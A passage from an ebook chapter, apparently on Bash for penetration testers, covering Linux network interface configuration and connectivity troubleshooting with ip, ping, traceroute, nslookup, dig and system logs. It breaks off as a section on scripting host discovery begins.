      <span class="koboSpan" id="kobo.255.1">
       be provided
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.256.1">
     The following example shows the output on my
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.257.1">
      Kali system:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer053">
     <span class="koboSpan" id="kobo.258.1">
      <img alt="Figure 6.5 – Example nmcli command output" src="image/B22229_06_05.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.259.1">
     Figure 6.5 – Example nmcli command output
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.260.1">
     Having learned how to
    </span>
    <a id="_idIndexMarker343">
    </a>
    <span class="koboSpan" id="kobo.261.1">
     enumerate network settings, let’s now move forward and explore configuring network interfaces
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.262.1">
      in Bash.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-116">
    <a id="_idTextAnchor156">
    </a>
    <span class="koboSpan" id="kobo.263.1">
     Configuring network interfaces using Bash commands
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.264.1">
     Alright, let’s dive into
    </span>
    <a id="_idIndexMarker344">
    </a>
    <span class="koboSpan" id="kobo.265.1">
     configuring network interfaces using
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.266.1">
      Bash commands.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.267.1">
     To configure a network interface
    </span>
    <a id="_idIndexMarker345">
    </a>
    <span class="koboSpan" id="kobo.268.1">
     using Bash commands, you can use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.269.1">
      ip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.270.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.270.2">
     Here’s an example of how you can set a static IP address on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.271.1">
      an interface:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.272.1">
$ sudo ip addr add 192.168.1.10/24 dev eth0
$ sudo ip link set eth0 up</span></pre>
   <p>
    <span class="koboSpan" id="kobo.273.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.274.1">
      ip addr
     </span>
    </strong>
    <span class="koboSpan" id="kobo.275.1">
     command adds the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.276.1">
      192.168.1.10
     </span>
    </strong>
    <span class="koboSpan" id="kobo.277.1">
     IP address with a subnet mask of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.278.1">
      255.255.255.0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.279.1">
     (which is represented as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.280.1">
      /24
     </span>
    </strong>
    <span class="koboSpan" id="kobo.281.1">
     in CIDR notation) to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.282.1">
      eth0
     </span>
    </strong>
    <span class="koboSpan" id="kobo.283.1">
     interface.
    </span>
    <span class="koboSpan" id="kobo.283.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.284.1">
      ip link
     </span>
    </strong>
    <span class="koboSpan" id="kobo.285.1">
     command brings the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.286.1">
      eth0
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.287.1">
      interface up.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.288.1">
     You can also add a default gateway using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.289.1">
      route
     </span>
    </strong>
    <span class="koboSpan" id="kobo.290.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.290.2">
     Here’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.291.1">
      an example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.292.1">
$ sudo ip route add default via 192.168.1.1 dev eth0</span></pre>
   <p>
    <span class="koboSpan" id="kobo.293.1">
     This command is used to manipulate the IP routing table.
    </span>
    <span class="koboSpan" id="kobo.293.2">
     This would add the default route and explicitly associate it with the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.294.1">
       eth0
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.295.1">
      interface.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.296.1">
     You can view the routing table by entering the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.297.1">
      route
     </span>
    </strong>
    <span class="koboSpan" id="kobo.298.1">
     command
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.299.1">
      by itself.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.300.1">
     Remember, these commands
    </span>
    <a id="_idIndexMarker346">
    </a>
    <span class="koboSpan" id="kobo.301.1">
     may require root privileges to execute successfully.
    </span>
    <span class="koboSpan" id="kobo.301.2">
     Always be cautious when making
    </span>
    <a id="_idIndexMarker347">
    </a>
    <span class="koboSpan" id="kobo.302.1">
     changes to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.303.1">
      network configurations.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-117">
    <a id="_idTextAnchor157">
    </a>
    <span class="koboSpan" id="kobo.304.1">
     Troubleshooting network connectivity with Bash tools
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.305.1">
     When you’re having network
    </span>
    <a id="_idIndexMarker348">
    </a>
    <span class="koboSpan" id="kobo.306.1">
     connectivity problems on a Linux system, it can be frustrating trying to figure out what’s wrong.
    </span>
    <span class="koboSpan" id="kobo.306.2">
     Luckily, there are a number of powerful command line tools built right in that can help you diagnose and resolve network issues quickly.
    </span>
    <span class="koboSpan" id="kobo.306.3">
     In this section, we’ll walk through some of the
    </span>
    <a id="_idIndexMarker349">
    </a>
    <span class="koboSpan" id="kobo.307.1">
     most useful network troubleshooting commands and show examples of how to use
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.308.1">
      them effectively.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.309.1">
     The first step in troubleshooting network problems is to make sure your network interfaces are up and configured properly.
    </span>
    <span class="koboSpan" id="kobo.309.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.310.1">
      ip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.311.1">
     command is the modern replacement for the older
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.312.1">
      ifconfig
     </span>
    </strong>
    <span class="koboSpan" id="kobo.313.1">
     command and provides detailed information about your network interfaces
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.314.1">
      and settings.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.315.1">
     To list details of a network interface, use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.316.1">
      ip link
     </span>
    </strong>
    <span class="koboSpan" id="kobo.317.1">
     command, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.318.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer054">
     <span class="koboSpan" id="kobo.319.1">
      <img alt="Figure 6.6 – Using ip link to show network interface configuration" src="image/B22229_06_06.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.320.1">
     Figure 6.6 – Using ip link to show network interface configuration
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.321.1">
     This will show you the name, state (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.322.1">
      UP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.323.1">
     /
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.324.1">
      DOWN
     </span>
    </strong>
    <span class="koboSpan" id="kobo.325.1">
     ), and MAC address of each interface.
    </span>
    <span class="koboSpan" id="kobo.325.2">
     If an interface is down that should be up, you can
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.326.1">
      enable it:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.327.1">
$ sudo ip link set eth0 up</span></pre>
   <p>
    <span class="koboSpan" id="kobo.328.1">
     To view the IP address configuration of an interface, you can
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.329.1">
      do this:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.330.1">
$ ip address show eth0</span></pre>
   <p>
    <span class="koboSpan" id="kobo.331.1">
     This displays the interface’s IP address, netmask, broadcast address, and more.
    </span>
    <span class="koboSpan" id="kobo.331.2">
     If the interface doesn’t have an IP when it should, there may be a problem with DHCP or your static IP configuration in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.332.1">
      /
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.333.1">
       etc/network/interfaces
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.334.1">
      file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.335.1">
     Once you’ve verified the
    </span>
    <a id="_idIndexMarker350">
    </a>
    <span class="koboSpan" id="kobo.336.1">
     interfaces are up and have IPs, the next step is testing basic connectivity to other hosts using
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.337.1">
      ping
     </span>
    </strong>
    <span class="koboSpan" id="kobo.338.1">
     .
    </span>
    <span class="koboSpan" id="kobo.338.2">
     Ping uses
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.339.1">
      Internet Control Message Protocol
     </span>
    </strong>
    <span class="koboSpan" id="kobo.340.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.341.1">
      ICMP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.342.1">
     ) echo requests to test if a remote
    </span>
    <a id="_idIndexMarker351">
    </a>
    <span class="koboSpan" id="kobo.343.1">
     host
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.344.1">
      is reachable.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.345.1">
     To ping a host by IP address
    </span>
    <a id="_idIndexMarker352">
    </a>
    <span class="koboSpan" id="kobo.346.1">
     or hostname, see the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.347.1">
      following example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.348.1">
$ ping 8.8.8.8
ping google.com</span></pre>
   <p>
    <span class="koboSpan" id="kobo.349.1">
     If the host is reachable, you’ll see replies that look like
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.350.1">
      the following:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.351.1">
64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=12.8 ms</span></pre>
   <p>
    <span class="koboSpan" id="kobo.352.1">
     If the host isn’t reachable, you’ll eventually see a timeout message such as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.353.1">
      the following:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.354.1">
From 192.168.1.10 icmp_seq=2 Destination Host Unreachable</span></pre>
   <p>
    <span class="koboSpan" id="kobo.355.1">
     This could indicate a problem with the remote host, or a connectivity issue along the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.356.1">
      network path.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.357.1">
     To get more information about where along the path the connectivity breaks down, use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.358.1">
      traceroute
     </span>
    </strong>
    <span class="koboSpan" id="kobo.359.1">
     command.
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.360.1">
      traceroute
     </span>
    </strong>
    <span class="koboSpan" id="kobo.361.1">
     shows you each network
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.362.1">
      hop
     </span>
    </em>
    <span class="koboSpan" id="kobo.363.1">
     between your host and the destination, along with the latency to each hop, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.364.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer055">
     <span class="koboSpan" id="kobo.365.1">
      <img alt="Figure 6.7 – An example of the traceroute program in action" src="image/B22229_06_07.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.366.1">
     Figure 6.7 – An example of the traceroute program in action
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.367.1">
     The output shows the IP, latency, and reverse DNS name (if available) of each router between the source and
    </span>
    <a id="_idIndexMarker353">
    </a>
    <span class="koboSpan" id="kobo.368.1">
     destination.
    </span>
    <span class="koboSpan" id="kobo.368.2">
     This can help identify problems such as high latency links or
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.369.1">
      unresponsive routers.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.370.1">
     If the trace stops abruptly before reaching the destination, there is likely a connectivity issue at that hop.
    </span>
    <span class="koboSpan" id="kobo.370.2">
     The problem could be caused by a downlink, misconfigured router, or firewall blocking the traffic.
    </span>
    <span class="koboSpan" id="kobo.370.3">
     If you see asterisks, it typically means the device is not responding or ICMP
    </span>
    <a id="_idIndexMarker354">
    </a>
    <span class="koboSpan" id="kobo.371.1">
     packets are
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.372.1">
      being blocked.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.373.1">
     Many connectivity issues are caused by problems with DNS name resolution.
    </span>
    <span class="koboSpan" id="kobo.373.2">
     If hostnames aren’t resolving to IP addresses correctly, you won’t be able to connect to them.
    </span>
    <span class="koboSpan" id="kobo.373.3">
     The
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.374.1">
      nslookup
     </span>
    </strong>
    <span class="koboSpan" id="kobo.375.1">
     and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.376.1">
      dig
     </span>
    </strong>
    <span class="koboSpan" id="kobo.377.1">
     tools let
    </span>
    <a id="_idIndexMarker355">
    </a>
    <span class="koboSpan" id="kobo.378.1">
     you test DNS lookups and view
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.379.1">
      the
     </span>
    </span>
    <span class="No-Break">
     <a id="_idIndexMarker356">
     </a>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.380.1">
      results.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.381.1">
     To look up the IP for a hostname
    </span>
    <a id="_idIndexMarker357">
    </a>
    <span class="koboSpan" id="kobo.382.1">
     with nslookup, enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.383.1">
      nslookup
     </span>
    </strong>
    <span class="koboSpan" id="kobo.384.1">
     command followed by the hostname, as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.385.1">
      shown next
     </span>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.386.1">
      :
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer056">
     <span class="koboSpan" id="kobo.387.1">
      <img alt="Figure 6.8 – An example of the nslookup command" src="image/B22229_06_08.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.388.1">
     Figure 6.8 – An example of the nslookup command
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.389.1">
     This will query your configured
    </span>
    <a id="_idIndexMarker358">
    </a>
    <span class="koboSpan" id="kobo.390.1">
     DNS server and show the IP address the name resolves to.
    </span>
    <span class="koboSpan" id="kobo.390.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.391.1">
      -query
     </span>
    </strong>
    <span class="koboSpan" id="kobo.392.1">
     option (or its shorthand
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.393.1">
      -q
     </span>
    </strong>
    <span class="koboSpan" id="kobo.394.1">
     ) allows you to specify the type of DNS record you want to look up.
    </span>
    <span class="koboSpan" id="kobo.394.2">
     Here
    </span>
    <a id="_idIndexMarker359">
    </a>
    <span class="koboSpan" id="kobo.395.1">
     are
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.396.1">
      some examples.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.397.1">
     This looks up the IPv4 address associated
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.398.1">
      with
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.399.1">
       example.com
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.400.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.401.1">
$ nslookup -query=A example.com</span></pre>
   <p>
    <span class="koboSpan" id="kobo.402.1">
     This retrieves the IPv6 address
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.403.1">
      for
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.404.1">
       example.com
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.405.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.406.1">
$ nslookup -query=AAAA example.com</span></pre>
   <p>
    <span class="koboSpan" id="kobo.407.1">
     This finds the mail servers responsible for handling email
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.408.1">
      for
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.409.1">
       example.com
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.410.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.411.1">
$ nslookup -query=MX example.com</span></pre>
   <p>
    <span class="koboSpan" id="kobo.412.1">
     This lists the authoritative name servers for the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.413.1">
       example.com
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.414.1">
      domain:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.415.1">
$ nslookup -query=NS example.com</span></pre>
   <p>
    <span class="koboSpan" id="kobo.416.1">
     For more detailed
    </span>
    <a id="_idIndexMarker360">
    </a>
    <span class="koboSpan" id="kobo.417.1">
     information, use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.418.1">
      dig
     </span>
    </strong>
    <span class="koboSpan" id="kobo.419.1">
     , as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.420.1">
      shown here:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer057">
     <span class="koboSpan" id="kobo.421.1">
      <img alt="Figure 6.9 – A demonstration of using the dig command" src="image/B22229_06_09.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.422.1">
     Figure 6.9 – A demonstration of using the dig command
    </span>
   </p>
   <p>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.423.1">
      dig
     </span>
    </strong>
    <span class="koboSpan" id="kobo.424.1">
     outputs the raw
    </span>
    <a id="_idIndexMarker361">
    </a>
    <span class="koboSpan" id="kobo.425.1">
     DNS response, including the query, answer, and various DNS flags and options.
    </span>
    <span class="koboSpan" id="kobo.425.2">
     This is useful for diagnosing low-level
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.426.1">
      DNS issues.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.427.1">
     If the lookups fail or return incorrect results, there may be a problem with your DNS server configuration in
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.428.1">
      /etc/resolv.conf
     </span>
    </strong>
    <span class="koboSpan" id="kobo.429.1">
     , or the DNS servers themselves may be
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.430.1">
      having issues.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.431.1">
     Finally, when troubleshooting network issues, don’t forget to check the relevant logs for clues.
    </span>
    <span class="koboSpan" id="kobo.431.2">
     On Kali and Debian, system
    </span>
    <a id="_idIndexMarker362">
    </a>
    <span class="koboSpan" id="kobo.432.1">
     logs are stored under the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.433.1">
      /
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.434.1">
       var/log
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.435.1">
      directory.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.436.1">
     Key log files for networking
    </span>
    <a id="_idIndexMarker363">
    </a>
    <span class="koboSpan" id="kobo.437.1">
     issues include
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.438.1">
      the following:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.439.1">
       /var/log/syslog
      </span>
     </strong>
     <span class="koboSpan" id="kobo.440.1">
      : General
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.441.1">
       system messages
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.442.1">
       /var/log/kern.log
      </span>
     </strong>
     <span class="koboSpan" id="kobo.443.1">
      : Kernel messages, including network
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.444.1">
       driver issues
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.445.1">
       /var/log/daemon.log
      </span>
     </strong>
     <span class="koboSpan" id="kobo.446.1">
      : Messages from
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.447.1">
       background services
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.448.1">
       /var/log/apache2/error.log
      </span>
     </strong>
     <span class="koboSpan" id="kobo.449.1">
      : Web
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.450.1">
       server errors
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.451.1">
       /var/log/mysql/error.log
      </span>
     </strong>
     <span class="koboSpan" id="kobo.452.1">
      :
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.453.1">
       Database errors
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.454.1">
     Use tools such as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.455.1">
      tail
     </span>
    </strong>
    <span class="koboSpan" id="kobo.456.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.457.1">
      less
     </span>
    </strong>
    <span class="koboSpan" id="kobo.458.1">
     , or
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.459.1">
      grep
     </span>
    </strong>
    <span class="koboSpan" id="kobo.460.1">
     to view the logs and search for relevant messages.
    </span>
    <span class="koboSpan" id="kobo.460.2">
     Let’s look at a few
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.461.1">
      use cases.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.462.1">
     For example, here’s how to view the last 100 lines
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.463.1">
      of
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.464.1">
       syslog
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.465.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.466.1">
$ tail -n 100 /var/log/syslog</span></pre>
   <p>
    <span class="koboSpan" id="kobo.467.1">
     Here’s how to search for mentions of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.468.1">
      eth0
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.469.1">
      in
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.470.1">
       kern.log
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.471.1">
      :
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.472.1">
$ grep eth0 /var/log/kern.log</span></pre>
   <p>
    <span class="koboSpan" id="kobo.473.1">
     If you get an error that these log files
    </span>
    <a id="_idIndexMarker364">
    </a>
    <span class="koboSpan" id="kobo.474.1">
     don’t exist, your system may be using
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.475.1">
      journald
     </span>
    </strong>
    <span class="koboSpan" id="kobo.476.1">
     .
    </span>
    <span class="koboSpan" id="kobo.476.2">
     To view the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.477.1">
      journald
     </span>
    </strong>
    <span class="koboSpan" id="kobo.478.1">
     logs in reverse order (latest first), showing only errors, use the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.479.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.480.1">
$ journalctl -r -p err</span></pre>
   <p>
    <span class="koboSpan" id="kobo.481.1">
     Error messages or warnings in the logs can often point you in the right direction for resolving
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.482.1">
      the issue.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.483.1">
     By leveraging these Linux command line tools, you can methodically test and diagnose network issues on your Debian systems.
    </span>
    <span class="koboSpan" id="kobo.483.2">
     Start by checking interface status with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.484.1">
      ip
     </span>
    </strong>
    <span class="koboSpan" id="kobo.485.1">
     , then move on to connectivity tests with ping and traceroute.
    </span>
    <span class="koboSpan" id="kobo.485.2">
     Use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.486.1">
      nslookup
     </span>
    </strong>
    <span class="koboSpan" id="kobo.487.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.488.1">
      dig
     </span>
    </strong>
    <span class="koboSpan" id="kobo.489.1">
     to verify DNS resolution.
    </span>
    <span class="koboSpan" id="kobo.489.2">
     Finally, don’t neglect to dig through the logs for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.490.1">
      relevant messages.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.491.1">
     While it takes some practice to get proficient with these tools, learning them well is an invaluable skill for any pentester.
    </span>
    <span class="koboSpan" id="kobo.491.2">
     They’ll enable you to quickly get to the bottom of complex
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.492.1">
      networking problems.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.493.1">
     Having now thoroughly
    </span>
    <a id="_idIndexMarker365">
    </a>
    <span class="koboSpan" id="kobo.494.1">
     covered network interface enumeration, configuration, and troubleshooting, in the
    </span>
    <a id="_idIndexMarker366">
    </a>
    <span class="koboSpan" id="kobo.495.1">
     next section, we’ll explore using Bash scripting in automation for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.496.1">
      network enumeration.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-118">
    <a id="_idTextAnchor158">
    </a>
    <span class="koboSpan" id="kobo.497.1">
     Scripting network enumeration
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.498.1">
     As a pentester, one
    </span>
    <a id="_idIndexMarker367">
    </a>
    <span class="koboSpan" id="kobo.499.1">
     of the most fundamental tasks is discovering which hosts are active and reachable on a network.
    </span>
    <span class="koboSpan" id="kobo.499.2">
     This information is crucial for mapping out the network topology, identifying potential targets for further testing, and ensuring proper network visibility.
    </span>
    <span class="koboSpan" id="kobo.499.3">
     While there are many tools available for network discovery, sometimes the simplest and most effective approach is to write your own Bash scripts.
    </span>
    <span class="koboSpan" id="kobo.499.4">
     In this section, we’ll explore how to leverage Bash scripting to discover active hosts on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.500.1">
      a network.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.501.1">
     The primary goal is to determine which IP addresses on a given network respond to network requests, indicating that a host is active and reachable at that address.
    </span>
    <span class="koboSpan" id="kobo.501.2">
     The most common method for network discovery is using ICMP echo requests, also known as
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.502.1">
      pings
     </span>
    </em>
    <span class="koboSpan" id="kobo.503.1">
     .
    </span>
    <span class="koboSpan" id="kobo.503.2">
     When you ping an IP
    </span>
    <a id="_idIndexMarker368">
    </a>
    <span class="koboSpan" id="kobo.504.1">
     address, your machine sends an ICMP echo request packet to that address.
    </span>
    <span class="koboSpan" id="kobo.504.2">
     If a host is active at that address, it will respond with an ICMP echo reply packet.
    </span>
    <span class="koboSpan" id="kobo.504.3">
     By systematically pinging a range of IP addresses, you can map out which hosts are responsive on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.505.1">
      the network.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.506.1">
     Another approach is to scan for open ports on each IP address.
    </span>
    <span class="koboSpan" id="kobo.506.2">
     If a host has open ports that respond to a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.507.1">
      TCP SYN
